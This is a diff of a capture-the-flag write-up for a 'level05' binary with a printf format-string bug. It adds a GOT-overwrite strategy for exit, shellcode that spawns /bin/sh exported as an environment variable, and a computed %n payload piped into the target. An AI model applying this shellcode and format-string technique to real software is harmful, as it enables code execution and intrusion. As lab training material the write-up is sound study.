@@ -3,14 +3,26 @@
 ## EXPLANATIONS
 
 ### BINARY BEHAVIOR
-- read stdin and print string uncapitalize
-print(buff)  format string exploit
+
+- fgets stdin into stack buffer
+- modify buffer with strtolower on buffer
+- printf(buff) format string exploit
+
 ### EXPLOIT STRATEGY
 
 - Overwrite GOT addresses of exit by SHELLCODE (which may be alterate by strtolower())
-- GOT of exit : 0x80497e0
+  - GOT of exit : 0x80497e0
+  - => create an env variable which contains the SHELLCODE
+  - => find the env variable address (we found an utilitary written in C to do this)
+  - => as the address is 0xffffdfc2, necessary padding for the %n exploit would be 4294959042
+    - => we split it in two 2bytes parts, writing them at 0x80497e0 and 0x80497e2
+      - => 0xffff => 0x80497e2
+      - => 0xdfc2 => 0x80497e0
+
 ### RUN COMMAND
 
-1110011 ^ 0100000 = 1010011
-0x20 = 0100000
-0x53 = 1010011
+```
+export SHELLCODE=$(python -c "print('\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80')")
+python -c "print('\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1]  + '%57274x' + '%10\$n' + '%8253x' + '%11\$n')" > /tmp/exploit_string
+cat /tmp/exploit_string - | env - PWD=$PWD SHELLCODE=$SHELLCODE /home/users/level05/level05
+```
